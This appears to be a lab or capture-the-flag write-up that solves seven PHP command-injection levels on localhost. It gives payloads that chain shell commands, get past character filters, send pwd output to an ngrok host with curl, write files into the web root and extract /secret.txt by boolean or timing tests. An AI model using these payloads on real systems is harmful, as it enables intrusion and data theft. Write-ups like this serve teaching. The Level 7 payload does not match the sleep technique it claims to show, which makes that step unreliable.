@@ -1,0 +1,163 @@
+    [LEVEL 1]-TARGET: http://localhost:3001
+
+      - we have php code here:
+         <?php
+            if(isset($_POST['command'],$_POST['target'])){
+                $command = $_POST['command'];
+                $target = $_POST['target'];
+                switch($command) {
+                    case "ping":
+                        $result = shell_exec("timeout 10 ping -c 4 $target 2>&1");
+                        break;
+                    case "nslookup":
+                        $result = shell_exec("timeout 10 nslookup $target 2>&1");
+                        break;	
+                    case "dig":
+                        $result = shell_exec("timeout 10 dig $target 2>&1");
+                        break;
+                }
+                die($result);
+            }
+        ?>
+    
+    => 3 case with shell_exec will execute the command inside ("") and the $target will be the user input
+
+    => Try with ping: shell_exec("timeout 10 ping -c 4 127.0.0.1; id 2>&1"); => Successful
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+    [LEVEL 2]-TARGET: http://localhost:3002
+
+      - We have filter here:
+        ...
+        if(isset($_POST['command'],$_POST['target'])){
+                $command = $_POST['command'];
+                $target = $_POST['target'];
+                if (strpos($target, ";") !== false)           // we can't use ';'
+                    die("Hacker detected!");
+                switch($command) {
+                    case "ping":
+                        $result = shell_exec("timeout 10 ping -c 4 $target 2>&1");
+                        break;
+        ...
+        }}
+
+      - But we know, there are many operators that have same function with ';' , such as: &&, &, ||, ... 
+
+      => shell_exec("timeout 10 ping -c 4 127.0.0.1 && id 2>&1");
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+    [LEVEL 3]-TARGET: http://localhost:3003
+
+    - Look at this: 
+
+            if(isset($_POST['command'],$_POST['target'])){
+            $command = $_POST['command'];
+            $target = $_POST['target'];
+            if (strpos($target, ";") !== false) 
+                die("Hacker detected!");
+            if (strpos($target, "&") !== false) 
+                die("Hacker detected!");
+            if (strpos($target, "|") !== false) 
+                die("Hacker detected!");
+            switch($command) {
+                case "ping":
+                    $result = shell_exec("timeout 10 ping -c 4 $target 2>&1");
+                    echo "<br>" . $result. "<br>";
+                    break; }}
+
+    => No way for our to use some previous tricks => We use change to use dig.
+
+    - With dig, $(id) will print out the variable of id => $() will be key.
+
+    => TRY: shell_exec("timeout 10 dig $(id) 2>&1");
+    => BOOM.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+      [LEVEL 4]-TARGET: http://localhost:3004
+
+      - It's really hard:
+
+        $command = $_POST['command'];
+        $target = $_POST['target'];
+        switch($command) {
+			case "backup":
+				$result = shell_exec("timeout 3 zip /tmp/$target -r /var/www/html/index.php 2>&1");
+                if ($result !== null && strpos($result, "zip error") === false)
+                    die("Backup thành công");
+                else
+                    die("Backup không thành công");
+				break;
+        }
+
+      => Nowhere to print the result.
+      => To solve this, you can use http.server or ngrok, depend on you. 
+
+      -TRY: shell_exec("timeout 3 zip /tmp/; curl "https://myngrok.com/$(pwd | base64)"; -r /var/www /html/index.php 2>&1") 
+
+      => You will get the sign back with base64 type, decode it and you will get full the sign.
+      => BOOM
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+      [LEVEL 5]-TARGET: http://localhost:3005
+
+      - There is a little diff in docker-compose.yml:
+          ...
+            networks:
+            - internet
+            - no-internet
+          ...
+
+      => You can't use ngrok more...
+      - But, let see:  
+
+        RUN chown -R root:www-data /var/www/html
+        RUN chmod 750 /var/www/html
+        RUN find . -type f -exec chmod 640 {} \;
+        RUN find . -type d -exec chmod 750 {} \;
+
+        RUN chmod +t -R /var/www/html/
+
+      - Yeah, it mean that with www-data, you can write or create file in /var/www/html.
+
+      => This is idea, let start:      shell_exec("timeout 3 zip /tmp/; touch hi.txt; echo "$(pwd)" > hi.txt ; -r /var/www /html/index.php 2>&1")
+
+      => Successful create file hi.txt and the in hi.txt you will have the 'pwd' of file.
+
+      - To check that, let: curl http://localhost:3005/hi.txt => /var/www/html => *BOOM*
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+      [LEVEL 6]-TARGET: http://localhost:3006
+
+      - In this level, you have no permission to write or create file like previous lesson.
+
+            build: ./cmdi_level6
+            container_name: 'cmdi_level06'
+            restart: 'unless-stopped'
+            volumes: 
+            - ./cmdi_level6/src/:/var/www/html/
+
+      - In this case, we can only check by boolean test in secret.txt, you have to guess or check the character until it true.
+
+      => test.zip -r /var/www/html/index.php 2>&1; if [ "$(cat /secret.txt | cut -c 1)" = "C" ]; then echo ""; else echo "zip error"; fi ; #
+
+      => you have to cut from 1 to end, ofcouse helped by Burpsuite with Intruder, not manually *heeheehe*.
+
+      => After you cut them all, you will got this: CBJS{FAKE_FLAG_FAKE_FLAG}.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+      [LEVEL 7]-TARGET: http://localhost:3007
+
+        - We have nowhere to check the boolen like previous lesson, but we get the sleep trick:
+        => look at this:
+                                test.zip -r /var/www/html/index.php 2>&1; if [ "$(cat /secret.txt | cut -c 1)" = "B" ]; then echo ""; else echo "zip error"; fi ; #
+
+        => This is sleep trick, if your guess is correct, you will wait 3s, if wrong, it only by 1s.
+  
+        =>CBJS{FAKE_FLAG_FAKE_FLAG} *BOOM*
+
